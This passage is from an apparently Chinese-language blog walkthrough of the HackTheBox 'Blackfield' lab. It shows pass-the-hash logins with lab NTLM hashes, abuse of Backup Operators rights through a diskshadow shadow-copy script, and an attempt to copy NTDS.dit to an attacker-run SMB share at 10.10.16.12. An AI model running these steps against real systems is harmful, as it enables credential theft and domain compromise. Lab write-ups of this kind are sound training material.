unimplemented on this machine                                                                                     <br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion                                                                                                       </span><br><br>Info: Establishing connection to remote endpoint<br><br><br></code></pre></td></tr></table></figure><p>重要的是svc_backup也不行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192<br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine                                                                                     <br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion                                                                                                       </span><br><br>Info: Establishing connection to remote endpoint<br><br><br></code></pre></td></tr></table></figure><p>看来我还是需要从smb共享下手，crackmapexec可以帮助我用hash进行枚举检测：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d<br>SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.<span class="hljs-built_in">local</span>) (signing:True) (SMBv1:False)<br>SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.<span class="hljs-built_in">local</span>\svc_backup:9658d1d1dcd9250115e2205d9f48400d<br></code></pre></td></tr></table></figure><p>我可以试一下<strong>administrator</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb 10.10.10.192 -u administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62<br>SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.<span class="hljs-built_in">local</span>) (signing:True) (SMBv1:False)<br>SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.<span class="hljs-built_in">local</span>\administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE <br></code></pre></td></tr></table></figure><p><strong>administrator</strong>哈希认证失败了，看来是更改掉了。svc_backup也无法直接PTH移动上去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./psexec.py svc_backup@10.10.10.192 -hashes :9658d1d1dcd9250115e2205d9f48400d -no-pass <br>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation<br><br>[*] Requesting shares on 10.10.10.192.....<br>[-] share <span class="hljs-string">&#x27;ADMIN$&#x27;</span> is not writable.<br>[-] share <span class="hljs-string">&#x27;C$&#x27;</span> is not writable.<br>[-] share <span class="hljs-string">&#x27;forensic&#x27;</span> is not writable.<br>[-] share <span class="hljs-string">&#x27;NETLOGON&#x27;</span> is not writable.<br>[-] share <span class="hljs-string">&#x27;profiles$&#x27;</span> is not writable.<br>[-] share <span class="hljs-string">&#x27;SYSVOL&#x27;</span> is not writable.<br></code></pre></td></tr></table></figure><p>wmiexec也不可以：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./wmiexec.py -hashes :9658d1d1dcd9250115e2205d9f48400d BLACKFIELD/svc_backup@10.10.10.192 <span class="hljs-string">&quot;whoami&quot;</span><br>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation<br><br>[*] SMBv3.0 dialect used<br>[-] rpc_s_access_denied<br></code></pre></td></tr></table></figure><p>我又尝试了crackmapexec的winrm枚举当前身份可访问的远程管理：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec winrm 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d<br>SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.<span class="hljs-built_in">local</span>)<br>HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman<br>WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.<span class="hljs-built_in">local</span>\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423133454652.png" alt="image-20220423133454652"  /><p>http链接打不开，Pwn3d!像是该用户的明文密码，可惜我还是登录不上去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -i 10.10.10.192 -u svc_backup -p Pwn3d!                          <br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>Error: An error of <span class="hljs-built_in">type</span> WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError<br><br>Error: Exiting with code 1<br><br></code></pre></td></tr></table></figure><p>smb也无法查看更多的共享：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.192 -u svc_backup -p <span class="hljs-string">&#x27;Pwn3d!&#x27;</span> <br>[!] Authentication error on 10.10.10.192<br></code></pre></td></tr></table></figure><p>如果administrator认证失败是因为哈希错误，那svc_backup应该是可以登录上去的啊，为什么会失败呢，我又试了一次，这次它竟然登录了进去，玄学：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d<br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; <br></code></pre></td></tr></table></figure><h4 id="获取user-txt"><a href="#获取user-txt" class="headerlink" title="获取user.txt:"></a>获取user.txt:</h4><p>我找到了user.txt：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\svc_backup&gt; <span class="hljs-built_in">cd</span> Desktop<br>*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\svc_backup\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        2/28/2020   2:26 PM             32 user.txt<br><br><br>*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; <span class="hljs-built_in">type</span> user.txt<br></code></pre></td></tr></table></figure><h4 id="利用卷影副本转储散列哈希："><a href="#利用卷影副本转储散列哈希：" class="headerlink" title="利用卷影副本转储散列哈希："></a>利用卷影副本转储散列哈希：</h4><p>我可以查看一下当前用户的权限，因为它的用户名看着像是Active Directory一个特殊的组：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; <span class="hljs-built_in">whoami</span> /priv<br><br>PRIVILEGES INFORMATION<br>----------------------<br><br>Privilege Name                Description                    State<br>============================= ============================== =======<br>SeMachineAccountPrivilege     Add workstations to domain     Enabled<br>SeBackupPrivilege             Back up files and directories  Enabled<br>SeRestorePrivilege            Restore files and directories  Enabled<br>SeShutdownPrivilege           Shut down the system           Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working <span class="hljs-built_in">set</span> Enabled<br></code></pre></td></tr></table></figure><p>它有添加工作站，备份，恢复，关机，绕过检查，增加一个进程工作集，因为它确实是在Backup Operators组中：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc_backup\Desktop&gt; net user svc_backup<br>User name                    svc_backup<br>Full Name<br>Comment<br>User<span class="hljs-string">&#x27;s comment</span><br><span class="hljs-string">Country/region code          000 (System Default)</span><br><span class="hljs-string">Account active               Yes</span><br><span class="hljs-string">Account expires              Never</span><br><span class="hljs-string"></span><br><span class="hljs-string">Password last set            2/23/2020 10:54:48 AM</span><br><span class="hljs-string">Password expires             Never</span><br><span class="hljs-string">Password changeable          2/24/2020 10:54:48 AM</span><br><span class="hljs-string">Password required            Yes</span><br><span class="hljs-string">User may change password     Yes</span><br><span class="hljs-string"></span><br><span class="hljs-string">Workstations allowed         All</span><br><span class="hljs-string">Logon script</span><br><span class="hljs-string">User profile</span><br><span class="hljs-string">Home directory</span><br><span class="hljs-string">Last logon                   4/23/2022 5:42:10 AM</span><br><span class="hljs-string"></span><br><span class="hljs-string">Logon hours allowed          All</span><br><span class="hljs-string"></span><br><span class="hljs-string">Local Group Memberships      *Backup Operators     *Remote Management Use</span><br><span class="hljs-string">Global Group memberships     *Domain Users</span><br><span class="hljs-string">The command completed successfully.</span><br><span class="hljs-string"></span><br><span class="hljs-string">*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; </span><br></code></pre></td></tr></table></figure><p>我可以进入管理员目录，但我无法访问root.txt，看起来我还是需要获取域管理员权限：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\administrator\desktop&gt; <span class="hljs-built_in">type</span> root.txt<br>Access to the path <span class="hljs-string">&#x27;C:\Users\administrator\desktop\root.txt&#x27;</span> is denied.<br>At line:<span class="hljs-number">1</span> char:<span class="hljs-number">1</span><br>+ <span class="hljs-built_in">type</span> root.txt<br>+ ~~~~~~~~~~~~~<br>    + CategoryInfo          : PermissionDenied: (C:\Users\administrator\desktop\root.txt:String) [<span class="hljs-built_in">Get-Content</span>], UnauthorizedAccessException<br>    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\administrator\desktop&gt;<br></code></pre></td></tr></table></figure><p>Backup Operators组中的人如果凭证泄露会很危险，因为他们可以创建磁盘卷影副本并访问系统正在使用的文件。例如读取Ntds.dit，它位于C:\Windows\NTDS\NTDS.dit。但是活动目录无时无刻不在访问Ntds.dit，如果直接对其进行更改操作会被系统拒绝。在以下文章中表述了好几种转储散列哈希值的方式，而我也找到了不会被系统拒绝的办法，例如我拷贝到其他地方，再试图对其更改读写便不会影响活动目录访问NTDS.dit乃至于我不会被拒绝：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>pentestlab.blog<span class="hljs-regexp">/tag/</span>diskshadow/<br></code></pre></td></tr></table></figure><p>关于diskshadow工具微软官方就有介绍文档：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>docs.microsoft.com<span class="hljs-regexp">/en-us/</span>windows-server<span class="hljs-regexp">/administration/</span>windows-commands/diskshadow<br></code></pre></td></tr></table></figure><p>关于diskshadow以及卷影副本更多的介绍，在《内网安全攻防：渗透测试实战指南》中有提到过，这是书中的部分示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">//设置卷影拷贝<br><span class="hljs-built_in">set</span> context persistent nowriters<br>//添加卷<br>add volume c: <span class="hljs-built_in">alias</span> &lt;卷名&gt;<br>//创建快照<br>create<br>//分配盘符<br>expose %&lt;卷名&gt;% &lt;盘符&gt;:<br></code></pre></td></tr></table></figure><p>那么我可以照葫芦画瓢：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> context persistent nowriters<br>add volume c: <span class="hljs-built_in">alias</span> whomi<br>create<br>expose %whomi% z:<br></code></pre></td></tr></table></figure><p>Evil-WinRM内置文件上传模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\svc_backup\desktop&gt; upload whoami.txt<br>Info: Uploading whoami.txt to C:\Users\svc_backup\desktop\whoami.txt<br><br>                                                             <br>Data: 112 bytes of 112 bytes copied<br><br>Info: Upload successful!<br><br>*Evil-WinRM* PS C:\Users\svc_backup\desktop&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\svc_backup\desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        2/28/2020   2:26 PM             32 user.txt<br>-a----        4/23/2022   6:29 AM             84 whoami.txt<br></code></pre></td></tr></table></figure><p>但是它失败了，它执行一半就停了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\svc_backup\desktop&gt; diskshadow /s whoami.txt<br>Microsoft DiskShadow version 1.0<br>Copyright (C) 2013 Microsoft Corporation<br>On computer:  DC01,  4/23/2022 6:31:58 AM<br><br>-&gt; <span class="hljs-built_in">set</span> context persistent nowriters<br>-&gt; add volume c: <span class="hljs-built_in">alias</span> whomi<br>-&gt; create<br><br>The .cab metadata file cannot be stored <span class="hljs-keyword">in</span> the current working directory, because it is read-only.<br><br>Use SET METADATA &lt;metadata.cab&gt; to specify an existing, writable directory<br></code></pre></td></tr></table></figure><p>我不知道什么原因，我担心同一个目录文件太多会遗留一堆垃圾，我准备换个目录试试，在我准备换个目录的时候我发现了以下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        5/26/2020   5:38 PM                PerfLogs<br>d-----         6/3/2020   9:47 AM                profiles<br>d-r---        3/19/2020  11:08 AM                Program Files<br>d-----         2/1/2020  11:05 AM                Program Files (x86)<br>d-----        4/23/2022   6:33 AM                temp<br>d-r---        2/23/2020   9:16 AM                Users<br>d-----        9/21/2020   4:29 PM                Windows<br>-a----        2/28/2020   4:36 PM            447 notes.txt<br><br><br>*Evil-WinRM* PS C:\&gt; <span class="hljs-built_in">type</span> notes.txt<br>Mates,<br><br>After the domain compromise and computer forensic last week, auditors advised us to:<br>- change every passwords -- Done.<br>- change krbtgt password twice -- Done.<br>- <span class="hljs-built_in">disable</span> auditor<span class="hljs-string">&#x27;s account (audit2020) -- KO.</span><br><span class="hljs-string">- use nominative domain admin accounts instead of this one -- KO.</span><br><span class="hljs-string"></span><br><span class="hljs-string">We will probably have to backup &amp; restore things later.</span><br><span class="hljs-string">- Mike.</span><br><span class="hljs-string"></span><br><span class="hljs-string">PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)</span><br></code></pre></td></tr></table></figure><p>root.txt是加密的，即使我能获取到也还需要密钥进行解密，但是这不应该是我当前想的事情，我得先获取管理员权限再说。为什么刚刚执行失败我也找到了原因，我在linux中编辑的文件，需要进行一次格式转换才能被windows正常识别：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">$ u<span class="hljs-symbol">nix2</span>dos whoami.txt <br>u<span class="hljs-symbol">nix2</span>dos: 正在转换文件 whoami.txt 为DOS格式...<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\temp&gt; upload whoami.txt<br>Info: Uploading whoami.txt to C:\temp\whoami.txt<br><br>                                                             <br>Data: 120 bytes of 120 bytes copied<br><br>Info: Upload successful!<br><br>*Evil-WinRM* PS C:\temp&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\temp<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        4/23/2022   6:42 AM             92 whoami.txt<br><br><br>*Evil-WinRM* PS C:\temp&gt; diskshadow /s whoami.txt<br>Microsoft DiskShadow version 1.0<br>Copyright (C) 2013 Microsoft Corporation<br>On computer:  DC01,  4/23/2022 6:43:05 AM<br><br>-&gt; <span class="hljs-built_in">set</span> context persistent nowriters<br>-&gt; add volume c: <span class="hljs-built_in">alias</span> whomi<br>-&gt; create<br>Alias whomi <span class="hljs-keyword">for</span> shadow ID &#123;40f76e7e-86ba-4fba-a5da-3a630b790a01&#125; <span class="hljs-built_in">set</span> as environment variable.<br>Alias VSS_SHADOW_SET <span class="hljs-keyword">for</span> shadow <span class="hljs-built_in">set</span> ID &#123;6b14bcc8-3129-4976-a812-9f81e5093ce8&#125; <span class="hljs-built_in">set</span> as environment variable.<br><br>Querying all shadow copies with the shadow copy <span class="hljs-built_in">set</span> ID &#123;6b14bcc8-3129-4976-a812-9f81e5093ce8&#125;<br><br>        * Shadow copy ID = &#123;40f76e7e-86ba-4fba-a5da-3a630b790a01&#125;               %whomi%<br>                - Shadow copy <span class="hljs-built_in">set</span>: &#123;6b14bcc8-3129-4976-a812-9f81e5093ce8&#125;       %VSS_SHADOW_SET%<br>                - Original count of shadow copies = 1<br>                - Original volume name: \\?\Volume&#123;6cd5140b-0000-0000-0000-602200000000&#125;\ [C:\]<br>                - Creation time: 4/23/2022 6:43:07 AM<br>                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1<br>                - Originating machine: DC01.BLACKFIELD.<span class="hljs-built_in">local</span><br>                - Service machine: DC01.BLACKFIELD.<span class="hljs-built_in">local</span><br>                - Not exposed<br>                - Provider ID: &#123;b5946137-7b9f-4925-af80-51abd60b20d5&#125;<br>                - Attributes:  No_Auto_Release Persistent No_Writers Differential<br><br>Number of shadow copies listed: 1<br>-&gt; expose %whomi% z:<br>-&gt; %whomi% = &#123;40f76e7e-86ba-4fba-a5da-3a630b790a01&#125;<br>The shadow copy was successfully exposed as z:\.<br>-&gt;<br>*Evil-WinRM* PS C:\temp&gt; <br></code></pre></td></tr></table></figure><p>可以看到这次回显的信息很多，并且有提示copy was successfully，看起来这次像是成功了，我可以试着访问Z卷：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\temp&gt; z:<br>*Evil-WinRM* PS Z:\&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: Z:\<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        5/26/2020   5:38 PM                PerfLogs<br>d-----         6/3/2020   9:47 AM                profiles<br>d-r---        3/19/2020  11:08 AM                Program Files<br>d-----         2/1/2020  11:05 AM                Program Files (x86)<br>d-----        4/23/2022   6:42 AM                temp<br>d-r---        2/23/2020   9:16 AM                Users<br>d-----        9/21/2020   4:29 PM                Windows<br>-a----        2/28/2020   4:36 PM            447 notes.txt<br><br><br>*Evil-WinRM* PS Z:\&gt; <br></code></pre></td></tr></table></figure><p>那么接下来我就应该读取Ntds.dit文件，为了方便，我想将Ntds.dit传入到我的机器中，我准备通过smb共享来实现：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ ./smbserver<span class="hljs-selector-class">.py</span> share /home/worldisend -smb2support -username whoami -password whoami                                 <br>Impacket v0.<span class="hljs-number">9.24</span> - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation<br><br><span class="hljs-selector-attr">[*]</span> Config file parsed<br><span class="hljs-selector-attr">[*]</span> Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">4</span>B324FC8-<span class="hljs-number">1670</span>-<span class="hljs-number">01</span>D3-<span class="hljs-number">1278</span>-<span class="hljs-number">5</span>A47BF6EE188 V:<span class="hljs-number">3.0</span><br><span class="hljs-selector-attr">[*]</span> Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">6</span>BFFD098-A112-<span class="hljs-number">3610</span>-<span class="hljs-number">9833</span>-<span class="hljs-number">46</span>C3F87E345A V:<span class="hljs-number">1.0</span><br><span class="hljs-selector-attr">[*]</span> Config file parsed<br><span class="hljs-selector-attr">[*]</span> Config file parsed<br><span class="hljs-selector-attr">[*]</span> Config file parsed<br></code></pre></td></tr></table></figure><p>不过可惜，权限不够：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">*Evil-WinRM* PS Z:\&gt; <span class="hljs-keyword">copy</span> z:\Windows\ntds\ntds.dit \\<span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.12</span>\<span class="hljs-keyword">share</span>\ntds.dit<br><span class="hljs-keyword">Access</span> <span class="hljs-keyword">to</span> the <span class="hljs-type">path</span> <span class="hljs-string">&#x27;Z:\Windows\ntds\ntds.dit&#x27;</span> <span class="hljs-keyword">is</span> denied.<br>At <span class="hljs-type">line</span>:<span class="hljs-number">1</span> <span class="hljs-type">char</span>:<span class="hljs-number">1</span><br>+ <span class="hljs-keyword">copy</span> z:\Windows\ntds\ntds.dit \\<span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.12</span>\<span class="hljs-keyword">share</span>\ntds.dit<br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : PermissionDenied: (Z:\Windows\ntds\ntds.dit:FileInfo) [<span class="hljs-keyword">Copy</span>-Item], UnauthorizedAccessException<br>    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand<br>*Evil-WinRM* PS Z:\&gt; <br></code></pre></td></tr></table></figure><p>这邪恶winRM自带的也不行：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs gradle">Evil-WinRM* PS Z:\&gt; robocopy /b z:\windows\ntds . ntds.dit<br><br>-------------------------------------------------------------------------------<br>   ROBOCOPY     ::     Robust <span class="hljs-keyword">File</span> <span class="hljs-keyword">Copy</span> <span class="hljs-keyword">for</span> Windows<br>-------------------------------------------------------------------------------<br><br>  Started : Saturday, April <span class="hljs-number">23</span>, <span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">56</span>:<span 